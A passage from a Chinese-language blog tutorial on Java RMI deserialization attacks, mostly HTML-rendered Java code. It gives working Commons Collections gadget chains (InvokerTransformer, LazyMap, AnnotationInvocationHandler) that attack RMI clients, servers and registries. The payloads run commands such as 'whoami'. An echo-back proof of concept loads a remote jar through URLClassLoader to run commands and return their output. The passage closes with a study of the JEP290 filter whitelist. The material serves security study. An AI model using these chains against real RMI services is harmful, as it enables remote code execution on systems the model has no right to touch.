class_">Class</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                    <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;</span><br><span class="line">                            Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;</span><br><span class="line">                            <span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                    <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,</span><br><span class="line">                            <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;open  /System/Applications/Calculator.app&quot;</span>&#125;)&#125;);</span><br><span class="line">            <span class="type">HashMap</span> <span class="variable">innermap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">            <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;org.apache.commons.collections.map.LazyMap&quot;</span>);</span><br><span class="line">            Constructor[] constructors = clazz.getDeclaredConstructors();</span><br><span class="line">            <span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> constructors[<span class="number">0</span>];</span><br><span class="line">            constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            <span class="type">Map</span> <span class="variable">map</span> <span class="operator">=</span> (Map) constructor.newInstance(innermap, chain);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            <span class="type">Constructor</span> <span class="variable">handler_constructor</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>).getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">            handler_constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            <span class="type">InvocationHandler</span> <span class="variable">map_handler</span> <span class="operator">=</span> (InvocationHandler) handler_constructor.newInstance(Override.class, map); <span class="comment">//创建第一个代理的handler</span></span><br><span class="line"></span><br><span class="line">            <span class="type">Map</span> <span class="variable">proxy_map</span> <span class="operator">=</span> (Map) Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(), <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Map.class&#125;, map_handler); <span class="comment">//创建proxy对象</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            <span class="type">Constructor</span> <span class="variable">AnnotationInvocationHandler_Constructor</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>).getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">            AnnotationInvocationHandler_Constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            handler = (InvocationHandler) AnnotationInvocationHandler_Constructor.newInstance(Override.class, proxy_map);</span><br><span class="line"></span><br><span class="line">        &#125;<span class="keyword">catch</span>(Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> (Object)handler;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>User接口</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">User</span> <span class="keyword">extends</span> <span class="title class_">java</span>.rmi.Remote &#123;</span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">getUser</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>服务端</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.rmi.AlreadyBoundException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.NotBoundException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"><span class="keyword">import</span> java.util.concurrent.CountDownLatch;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Server</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> RemoteException, AlreadyBoundException, InterruptedException, NotBoundException &#123;</span><br><span class="line">        <span class="type">User</span> <span class="variable">liming</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">LocalUser</span>(<span class="string">&quot;liming&quot;</span>,<span class="number">15</span>);</span><br><span class="line">        <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line">        registry.bind(<span class="string">&quot;user&quot;</span>,liming);</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;registry is running...&quot;</span>);</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;liming is bind in registry&quot;</span>);</span><br><span class="line"></span><br><span class="line">        CountDownLatch latch=<span class="keyword">new</span> <span class="title class_">CountDownLatch</span>(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        latch.await();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>客户端</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Client</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.getRegistry(<span class="string">&quot;127.0.0.1&quot;</span>,<span class="number">1099</span>);</span><br><span class="line">        <span class="type">User</span> <span class="variable">user</span> <span class="operator">=</span> (User) registry.lookup(<span class="string">&quot;user&quot;</span>);</span><br><span class="line">        user.getUser();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>当客户端调用服务端绑定的远程对象的getUser方法时，将反序列化服务端传来的恶意远程对象。此时将触发RCE</p>
<h3 id="加载远程对象"><a href="#加载远程对象" class="headerlink" title="加载远程对象"></a>加载远程对象</h3><p>这个条件十分十分苛刻，在现实生活中基本不可能碰到。</p>
<p>当服务端的某个方法返回的对象是客户端没有的时，客户端可以指定一个URL，此时会通过URL来实例化对象。</p>
<p><code>java.security.policy</code>这个默认是没有配置的，需要我们手动去配置</p>
<p><a href="https://paper.seebug.org/1091/#serverrmi-server">https://paper.seebug.org/1091/#serverrmi-server</a></p>
<h2 id="攻击服务端"><a href="#攻击服务端" class="headerlink" title="攻击服务端"></a>攻击服务端</h2><p>上面说了利用注册中心攻击客户端，同样的方法也可以攻击服务端，这里说一下客户端攻击服务端的方式</p>
<p><strong>当服务端的远程方法存在Object参数的情况下</strong></p>
<p>如果服务端的某个方法，传递的参数是Object类型的参数，当服务端接收数据时，就会调用readObject，所以我们可以从这个角度入手来攻击服务端。</p>
<p>我们写一个addUser方法，是接收Object类型参数的</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">User</span> <span class="keyword">extends</span> <span class="title class_">java</span>.rmi.Remote &#123;</span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">getUser</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">addUser</span><span class="params">(Object user)</span> <span class="keyword">throws</span> RemoteException;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>当客户端调用这个方法时候，服务端会对其传递的参数进行反序列化。</p>
<p>Client Demo:</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.rmi.Remote;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Client</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(<span class="keyword">new</span> <span class="title class_">Transformer</span>[] &#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;</span><br><span class="line">                        String.class, Class[].class &#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123;</span><br><span class="line">                        <span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>] &#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;</span><br><span class="line">                        Object.class, Object[].class &#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123;</span><br><span class="line">                        <span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>] &#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; String.class &#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;open  /System/Applications/Calculator.app&quot;</span>&#125;)&#125;);</span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">innermap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;org.apache.commons.collections.map.LazyMap&quot;</span>);</span><br><span class="line">        Constructor[] constructors = clazz.getDeclaredConstructors();</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> constructors[<span class="number">0</span>];</span><br><span class="line">        constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">map</span> <span class="operator">=</span> (Map)constructor.newInstance(innermap,chain);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">handler_constructor</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>).getDeclaredConstructor(Class.class,Map.class);</span><br><span class="line">        handler_constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">map_handler</span> <span class="operator">=</span> (InvocationHandler) handler_constructor.newInstance(Override.class,map); <span class="comment">//创建第一个代理的handler</span></span><br><span class="line"></span><br><span class="line">        <span class="type">Map</span> <span class="variable">proxy_map</span> <span class="operator">=</span> (Map) Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(),<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Map.class&#125;,map_handler); <span class="comment">//创建proxy对象</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">AnnotationInvocationHandler_Constructor</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>).getDeclaredConstructor(Class.class,Map.class);</span><br><span class="line">        AnnotationInvocationHandler_Constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">handler</span> <span class="operator">=</span> (InvocationHandler)AnnotationInvocationHandler_Constructor.newInstance(Override.class,proxy_map);</span><br><span class="line"></span><br><span class="line">        <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.getRegistry(<span class="string">&quot;127.0.0.1&quot;</span>,<span class="number">1099</span>);</span><br><span class="line">        <span class="type">User</span> <span class="variable">user</span> <span class="operator">=</span> (User) registry.lookup(<span class="string">&quot;user&quot;</span>);</span><br><span class="line">        user.addUser(handler);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="利用URLClassLoader实现回显攻击"><a href="#利用URLClassLoader实现回显攻击" class="headerlink" title="利用URLClassLoader实现回显攻击"></a>利用URLClassLoader实现回显攻击</h2><p>攻击注册中心时，注册中心遇到异常会直接把异常发回来，返回给客户端。这里我们利用URLClassLoader加载远程jar，传入服务端，反序列化后调用其方法，在方法内抛出错误，错误会传回客户端</p>
<p>远程demo:</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.BufferedReader;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStreamReader;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ErrorBaseExec</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">do_exec</span><span class="params">(String args)</span> <span class="keyword">throws</span> Exception</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">Process</span> <span class="variable">proc</span> <span class="operator">=</span> Runtime.getRuntime().exec(args);</span><br><span class="line">        <span class="type">BufferedReader</span> <span class="variable">br</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedReader</span>(<span class="keyword">new</span> <span class="title class_">InputStreamReader</span>(proc.getInputStream()));</span><br><span class="line">        <span class="type">StringBuffer</span> <span class="variable">sb</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuffer</span>();</span><br><span class="line">        String line;</span><br><span class="line">        <span class="keyword">while</span> ((line = br.readLine()) != <span class="literal">null</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            sb.append(line).append(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">String</span> <span class="variable">result</span> <span class="operator">=</span> sb.toString();</span><br><span class="line">        Exception e=<span class="keyword">new</span> <span class="title class_">Exception</span>(result);</span><br><span class="line">        <span class="keyword">throw</span> e;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>通过如下命令制作成jar包</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">javac ErrorBaseExec.java</span><br><span class="line">jar -cvf RMIexploit.jar ErrorBaseExec.class</span><br></pre></td></tr></table></figure>

<p>客户端POC:</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Target;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.net.URLClassLoader;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.rmi.Remote;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Client</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Constructor&lt;?&gt; getFirstCtor(<span class="keyword">final</span> String name)</span><br><span class="line">            <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">final</span> Constructor&lt;?&gt; ctor = Class.forName(name).getDeclaredConstructors()[<span class="number">0</span>];</span><br><span class="line">        ctor.setAccessible(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> ctor;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">ip</span> <span class="operator">=</span> <span class="string">&quot;127.0.0.1&quot;</span>; <span class="comment">//注册中心ip</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">port</span> <span class="operator">=</span> <span class="number">1099</span>; <span class="comment">//注册中心端口</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">remotejar</span> <span class="operator">=</span> 远程jar;</span><br><span class="line">        <span class="type">String</span> <span class="variable">command</span> <span class="operator">=</span> <span class="string">&quot;whoami&quot;</span>;</span><br><span class="line">        <span class="keyword">final</span> <span class="type">String</span> <span class="variable">ANN_INV_HANDLER_CLASS</span> <span class="operator">=</span> <span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">final</span> Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[] &#123;</span><br><span class="line">                    <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(java.net.URLClassLoader.class),</span><br><span class="line">                    <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getConstructor&quot;</span>,</span><br><span class="line">                            <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; Class[].class &#125;,</span><br><span class="line">                            <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123; <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; java.net.URL[].class &#125; &#125;),</span><br><span class="line">                    <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;newInstance&quot;</span>,</span><br><span class="line">                            <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; Object[].class &#125;,</span><br><span class="line">                            <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123;</span><br><span class="line">                                    <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123;</span><br><span class="line">                                            <span class="keyword">new</span> <span class="title class_">java</span>.net.URL[] &#123; <span class="keyword">new</span> <span class="title class_">java</span>.net.URL(remotejar) &#125;</span><br><span class="line">                                    &#125;</span><br><span class="line">                            &#125;),</span><br><span class="line">                    <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;loadClass&quot;</span>,</span><br><span class="line">                            <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; String.class &#125;,</span><br><span class="line">                            <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123; <span class="string">&quot;ErrorBaseExec&quot;</span> &#125;),</span><br><span class="line">                    <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,</span><br><span class="line">                            <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; String.class, Class[].class &#125;,</span><br><span class="line">                            <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123; <span class="string">&quot;do_exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; String.class &#125; &#125;),</span><br><span class="line">                    <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,</span><br><span class="line">                            <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; Object.class, Object[].class &#125;,</span><br><span class="line">                            <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123; <span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">String</span>[] &#123; command &#125; &#125;)</span><br><span class="line">            &#125;;</span><br><span class="line">            <span class="type">Transformer</span> <span class="variable">transformedChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">            <span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">            innerMap.put(<span class="string">&quot;value&quot;</span>, <span class="string">&quot;value&quot;</span>);</span><br><span class="line"></span><br><span class="line">            <span class="type">Map</span> <span class="variable">outerMap</span> <span class="operator">=</span> TransformedMap.decorate(innerMap, <span class="literal">null</span>,</span><br><span class="line">                    transformedChain);</span><br><span class="line">            <span class="type">Class</span> <span class="variable">cl</span> <span class="operator">=</span> Class.forName(</span><br><span class="line">                    <span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">            <span class="type">Constructor</span> <span class="variable">ctor</span> <span class="operator">=</span> cl.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">            ctor.setAccessible(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">            <span class="type">Object</span> <span class="variable">instance</span> <span class="operator">=</span> ctor.newInstance(Target.class, outerMap);</span><br><span class="line">            <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.getRegistry(ip, port);</span><br><span class="line">            <span class="type">InvocationHandler</span> <span class="variable">h</span> <span class="operator">=</span> (InvocationHandler) getFirstCtor(ANN_INV_HANDLER_CLASS)</span><br><span class="line">                    .newInstance(Target.class,</span><br><span class="line">                            outerMap);</span><br><span class="line">            <span class="type">Remote</span> <span class="variable">r</span> <span class="operator">=</span> Remote.class.cast(Proxy.newProxyInstance(</span><br><span class="line">                    Remote.class.getClassLoader(),</span><br><span class="line">                    <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; Remote.class &#125;, h));</span><br><span class="line">            registry.bind(<span class="string">&quot;liming&quot;</span>, r);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                System.out.print(e.getCause().getCause().getCause().getMessage());</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception ee) &#123;</span><br><span class="line">                <span class="keyword">throw</span> e;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="JEP290及其绕过"><a href="#JEP290及其绕过" class="headerlink" title="JEP290及其绕过"></a>JEP290及其绕过</h1><p>这部分打算后面来深入了</p>
<h2 id="JEP290介绍"><a href="#JEP290介绍" class="headerlink" title="JEP290介绍"></a>JEP290介绍</h2><p><code>JEP290</code>机制是用来过滤传入的序列化数据，以提高安全性，在反序列化的过程中，新增了一个<code>filterCheck</code>方法，所以，任何反序列化操作都会经过这个<code>filterCheck</code>方法，利用<code>checkInput</code>方法来对序列化数据进行检测，如果有任何不合格的检测，<code>Filter</code>将返回<code>REJECTED</code>。但是<code>jep290</code>的<code>filter</code>需要手动设置，通过<code>setObjectInputFilter</code>来设置<code>filter</code>，如果没有设置，还是不会有白名单。</p>
<p>在<code>JDK6u141</code>、<code>JDK7u131</code>、<code>JDK 8u121</code>加入了JEP 290限制,JEP 290过滤策略有</p>
<h5 id="进程级过滤器"><a href="#进程级过滤器" class="headerlink" title="进程级过滤器"></a>进程级过滤器</h5><p>可以将进程级序列化过滤器作为命令行参数<code>-Djdk.serialFilter =</code>传递，或将其设置为<code>$JAVA_HOME/conf/security/java.security</code>中的系统属性。</p>
<h5 id="自定义过滤器"><a href="#自定义过滤器" class="headerlink" title="自定义过滤器"></a>自定义过滤器</h5><p>可以使用自定义过滤器来重写特定流的进程级过滤器</p>
<h5 id="内置过滤器"><a href="#内置过滤器" class="headerlink" title="内置过滤器"></a>内置过滤器</h5><p>JDK分别为RMI注册表和RMI分布式垃圾收集器提供了相应的内置过滤器。这两个过滤器都配置为白名单，即只允许反序列化特定类。</p>
<p>这里我把jdk版本换成<code>jdk1.8.0_181</code>,默认使用内置过滤器。然后直接使用上面的服务端攻击注册中心poc看下,执行完RMI Registry会提示这样的一个错误:</p>
<figure class="highlight smali"><table><tr><td class="code"><pre><span class="line">信息: ObjectInputFilter REJECTED: class sun.reflect.annotation.AnnotationInvocationHandler,<span class="built_in"> array </span>length: -1, nRefs: 8, depth: 2, bytes: 285, ex: n/a</span><br></pre></td></tr></table></figure>

<p>debug看下</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">sun.rmi.registry.RegistryImpl#registryFilter</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> Status <span class="title function_">registryFilter</span><span class="params">(FilterInfo var0)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (registryFilter != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="type">Status</span> <span class="variable">var1</span> <span class="operator">=</span> registryFilter.checkInput(var0);</span><br><span class="line">            <span class="keyword">if</span> (var1 != Status.UNDECIDED) &#123;</span><br><span class="line">                <span class="keyword">return</span> var1;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (var0.depth() &gt; <span class="number">20L</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> Status.REJECTED;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="type">Class</span> <span class="variable">var2</span> <span class="operator">=</span> var0.serialClass();</span><br><span class="line">            <span class="keyword">if</span> (var2 != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (!var2.isArray()) &#123;</span><br><span class="line">                    <span class="keyword">return</span> String.class != var2 &amp;&amp; !Number.class.isAssignableFrom(var2) &amp;&amp; !Remote.class.isAssignableFrom(var2) &amp;&amp; !Proxy.class.isAssignableFrom(var2) &amp;&amp; !UnicastRef.class.isAssignableFrom(var2) &amp;&amp; !RMIClientSocketFactory.class.isAssignableFrom(var2) &amp;&amp; !RMIServerSocketFactory.class.isAssignableFrom(var2) &amp;&amp; !ActivationID.class.isAssignableFrom(var2) &amp;&amp; !UID.class.isAssignableFrom(var2) ? Status.REJECTED : Status.ALLOWED;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">return</span> var0.arrayLength() &gt;= <span class="number">0L</span> &amp;&amp; var0.arrayLength() &gt; <span class="number">1000000L</span> ? Status.REJECTED : Status.UNDECIDED;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">return</span> Status.UNDECIDED;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>白名单列表:</p>
<ul>
<li>String.class</li>
<li>Number.class</li>
<li>Remote.class</li>
<li>Proxy.class</li>
<li>UnicastRef.class</li>
<li>RMIClientSocketFactory.class</li>
<li>RMIServerSocketFactory.class</li>
<li>ActivationID.class</li>
<li>UID.class</li>
</ul>
<p>调用栈</p>
